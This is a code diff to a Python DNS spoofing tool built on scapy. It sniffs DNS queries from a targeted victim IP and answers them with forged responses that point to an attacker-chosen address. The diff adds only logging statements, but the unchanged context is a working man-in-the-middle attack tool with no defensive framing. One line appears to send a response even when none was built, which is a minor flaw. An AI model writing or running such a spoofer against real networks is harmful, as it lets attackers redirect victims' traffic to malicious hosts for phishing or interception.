@@ -1,7 +1,7 @@
 from scapy.all import *
 from scapy.layers.dns import DNS, DNSQR, DNSRR
 from scapy.layers.inet import IP, UDP
-
+from logger import log_info, log_warning
 
 class DNSSpoofer:
     def __init__(self, interface, ip_victim, ip_to_spoof):
@@ -10,12 +10,14 @@ class DNSSpoofer:
         self.ip_to_spoof = ip_to_spoof
 
     def spoof(self):
+        log_info("Starting DNS spoofing")
         sniff(
             filter="udp port 53",
             prn=self._on_dns_request,
             iface=self.interface,
             count=0,
         )
+        log_warning("Stopping DNS spoofing")
 
     def _on_dns_request(self, packet):
         # Check that we received a DNS query. And check that the query comes from the victim.
@@ -24,6 +26,11 @@ class DNSSpoofer:
             and packet[DNS].qr == 0
             and packet[IP].src == self.ip_victim
         ):
+            log_info(
+                "Received DNS query for {} from {}".format(
+                    packet[DNSQR].qname, packet[IP].src
+                )
+            )
             # Construct the DNS response
             response = (
                 IP(dst=packet[IP].src, src=packet[IP].dst)
@@ -38,3 +45,4 @@ class DNSSpoofer:
             )
 
         send(response, verbose=0)
+        log_info("Sent DNS response for {} to {}".format(packet[DNSQR].qname, packet[IP].src))
